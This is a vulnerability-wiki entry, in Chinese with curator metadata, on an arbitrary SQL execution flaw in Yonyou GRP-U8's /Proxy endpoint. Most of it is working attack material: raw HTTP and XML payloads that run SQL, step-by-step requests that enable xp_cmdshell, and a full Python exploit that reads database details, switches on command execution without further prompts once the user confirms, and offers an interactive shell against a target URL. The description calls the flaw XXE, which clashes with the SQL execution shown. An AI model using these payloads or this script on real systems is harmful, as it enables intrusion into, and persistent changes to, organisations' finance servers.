---
source: "Threekiii/Vulnerability-Wiki"
title: "用友GRP-U8 Proxy任意SQL执行"
product: "用友GRP-U8"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CNNVD-201610-923"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "新政府会计制度专版；具体build缺"
prerequisites: "DB高权限/xp_cmdshell条件"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
identifier_role: "primary"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BGRP-u8/%E7%94%A8%E5%8F%8B-GRP-U8-Proxy-SQL%E6%B3%A8%E5%85%A5-CNNVD-201610-923.md"
id: "vw-f8444c3ae74021a91bcf0a8a"
entity_id: "ve-f8444c3ae74021a91bcf0a8a"
schema_version: "1"
---

# 用友GRP-U8 Proxy任意SQL执行

## 条目说明

- 对象与具体问题：用友GRP-U8；Proxy任意SQL执行
- 版本、配置及部署条件：新政府会计制度专版；具体build缺
- 认证与权限前提：DB高权限/xp_cmdshell条件
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- HTTP头压同一行；配置循环num=5在最后reconfigure之前执行POC2
- 开启数据库命令能力有持久安全影响且无回滚，忽略异常不合适
- CNNVD可主ID但元数据漏，需官方版本核验

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

用友GRP-u8存在XXE漏洞，该漏洞源于应用程序解析XML输入时没有进制外部实体的加载，导致可加载外部SQL语句，以及命令执行

### 漏洞影响

```
用友GRP-U8行政事业内控管理软件（新政府会计制度专版）
```

### 网络测绘

```
title="用友GRP-U8行政事业内控管理软件"
```

### 漏洞复现

漏洞利用POC请求包

```http
POST /Proxy HTTP/1.1
Accept: Accept: */*
Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host
Connection: Keep-Alive
Cache-Control: no-cache


cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>
```

> 请求长度说明：原资料 Content-Length 为 357；静态长度已移除，应由客户端根据最终请求体的字节数生成。

请求后按F12查看源代码可以得到SQL语句查询结果

![yongyou-7-1](./.resource/用友-GRP-U8-Proxy-SQL注入-CNNVD-201610-923/media/yongyou-7-1.png)


![yongyou-7-2](./.resource/用友-GRP-U8-Proxy-SQL注入-CNNVD-201610-923/media/yongyou-7-2.png)


也可以调用 **xp_cmdshell** 来执行系统命令(大部分此系统为**windows**)

![yongyou-7-3](./.resource/用友-GRP-U8-Proxy-SQL注入-CNNVD-201610-923/media/yongyou-7-3.png)


- 注意：大部分默认是不开启 xp_cmdshell 模块的

![yongyou-7-4](./.resource/用友-GRP-U8-Proxy-SQL注入-CNNVD-201610-923/media/yongyou-7-4.png)


可以使用如下方法打开**xp_cmdshell方法**

将如下POST数据按顺序发送(**注意 master 改为当前数据库名**)

```xml
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">use master</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

```xml
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec sp_configure 'show advanced options',1</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

```xml
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">reconfigure</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

```xml
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec sp_configure 'xp_cmdshell',1</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

```xml
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">reconfigure</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

- 发送如上实际为执行SQL语句打开 xp_cmdshell
  use master;
  exec sp_configure 'show advanced options',1;
  reconfigure;
  exec sp_configure 'xp_cmdshell',1;
  reconfigure;

再发送以下数据可成功使用(也可能失败)

```xml
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "whoami"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

- 执行过程中报错 java.sql.SQLException【错误代码: 0; 相关信息:xxxxxx】不用理会

发送请求后再使用此模块则会成功请求执行系统命令

### 漏洞POC

```python
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech


import requests
import re
import sys


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: 用友GRP-U8行政事业内控管理软件                                \033[0m')
    print('+  \033[36m使用格式: python3 CNNVD-201610-923.py                               \033[0m')
    print('+  \033[36mUrl    >>> http://xxx.xxx.xxx.xxx                                 \033[0m')
    print('+  \033[36m(Y/N)  >>> Y or N                                                  \033[0m')
    print('+  \033[36mcmd    >>> ipconfig                                                \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    check_url = target_url + "/Proxy"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = """cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">select 1,user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>"""
    try:
        print("\033[32m[o] 正在执行SQL语句:select 1,user,db_name(),host_name(),@@version...\033[0m")
        response = requests.post(url=check_url, headers=headers, data=data, timeout=10)

        row_1 = '<ROW COLUMN1="1"'
        row_2 = r'COLUMN2="(.*?)"'
        row_3 = r'COLUMN3="(.*?)"'
        row_4 = r'COLUMN4="(.*?)"'
        row_5 = r'COLUMN5="(.*?)"'

        if row_1 in response.text and "服务器错误信息：null" not in response.text:
            db_user = re.findall(row_2, response.text)[0]
            db_name = re.findall(row_3, response.text)[0]
            db_host = re.findall(row_4, response.text)[0]
            db_vers = re.findall(row_5, response.text)[0]
            print("\033[32m[o] 存在漏洞，漏洞响应为:\033[0m")
            print("\033[32m >> 数据库用户为:{}\033[0m".format(db_user))
            print("\033[32m >> 数据库名为:{}\033[0m".format(db_name))
            print("\033[32m >> 数据库主机名为:{}\033[0m".format(db_host))
            print("\033[32m >> 数据库版本为:{}\033[0m".format(db_vers))
            return db_name
        else:
            print("\033[31m[x] 漏洞已被修复 \033[0m")
            sys.exit(0)
    except:
        print("\033[31m[x] 请求失败 \033[0m")
        sys.exit(0)

def xp_cmdshell_open(target_url, db_name):
    open_sql = ["use {}".format(db_name),"exec sp_configure 'show advanced options',1","reconfigure","exec sp_configure 'xp_cmdshell',1","reconfigure"]
    num = 1
    for sql in open_sql:
        open_url = target_url + "/Proxy"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">{}</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'.format(sql)
        try:
            print("\033[32m[o] 正在执行SQL语句:{}...\033[0m".format(sql))
            response = requests.post(url=open_url, headers=headers, data=data, timeout=10)
            num = num + 1
            if num == 5 :
                POC_2(target_url, db_name)

        except:
            print("\033[31m[x] 开启 xp_cmdsheall 失败 \033[0m")
            sys.exit(0)

def POC_2(target_url, db_name):
    db_name = db_name
    sql_cmd_url = target_url + "/Proxy"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = """cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "whoami"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>"""
    try:
        print("\033[32m[o] 正在执行SQL语句:exec xp_cmdshell 'whoami'...\033[0m")
        response = requests.post(url=sql_cmd_url, headers=headers, data=data, timeout=10)
        if 'exec xp_cmdshell' in response.text:
            print("\033[31m[x] 数据库未开启 xp_cmdshell 模块\033[0m")
            sqlcmd_open = str(input("\033[35m是否开启 xp_cmdshell\n(Y/N)   >>> \033[0m"))
            if sqlcmd_open == 'Y' or sqlcmd_open == 'y':
                xp_cmdshell_open(target_url, db_name)
            else:
                print("\033[31m[x] 停止开启 xp_cmdshell \033[0m")
                sys.exit(0)
        else:
            whoami = re.findall(r'output="(.*?)"', response.text)[0]
            print("\033[32m[o] 成功执行SQL语句:exec xp_cmdshell 'whoami'...\n>>> {}\033[0m".format(whoami))

    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

def POC_3(target_url, cmd):
    vuln_url = target_url + "/Proxy"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "{}"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'.format(cmd)
    try:
        print("\033[32m[o] 正在执行SQL语句:exec xp_cmdshell '{}'...\033[0m".format(cmd))
        response = requests.post(url=vuln_url, headers=headers, data=data, timeout=10)

        data = re.findall(r'output="(.*?)"', response.text)
        for i in data:
            print("\033[32m >>> {}\033[0m".format(i))
    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    db_name = POC_1(target_url)
    POC_2(target_url, db_name)

    while True:
        cmd = input("\033[35mCmd >>> \033[0m")
        if cmd == "exit":
            sys.exit(0)
        else:
            POC_3(target_url, cmd)
```

![yongyou-7-5](./.resource/用友-GRP-U8-Proxy-SQL注入-CNNVD-201610-923/media/yongyou-7-5.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
